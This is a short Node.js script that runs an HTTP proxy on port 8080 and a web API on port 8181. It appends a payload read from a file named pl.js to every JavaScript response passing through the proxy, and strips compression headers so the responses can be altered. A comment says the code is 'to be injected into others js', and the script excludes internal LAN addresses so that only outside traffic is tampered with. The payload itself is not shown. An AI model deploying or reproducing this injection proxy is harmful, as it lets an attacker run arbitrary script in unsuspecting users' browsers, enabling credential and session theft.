

// start proxy server on port 8080
var proxy = require('proxy-tamper').start({port: 8080});

// start web api on port 8181
require('http').createServer(API_onRequest).listen(8181);

// js to be injected into others js
var payload = require("fs").readFileSync("./pl.js");

/* prevent connections to internal LAN */
proxy.tamper(/192\.168/, abortRequest);
proxy.tamper(/127\.0/, abortRequest);
proxy.tamper(/localhost/, abortRequest);

// web proxy helper function
function abortRequest(request)
{
    request.url = "****";
    request.headers["host"] = "****";
}

 /* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    WEB PROXY BEHAVIOR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
proxy.tamper(/\.js/, function(request){
    delete request.headers['accept-encoding'];
    request.onResponse(function (response) {
        //console.log("code injected: " + payload);
        response.body += payload;
        response.headers['content-length'] = response.body.length;
        //response.headers["Cache-Control"] = "max-age=86400"; // 24 hrs
        response.complete();
    });
});
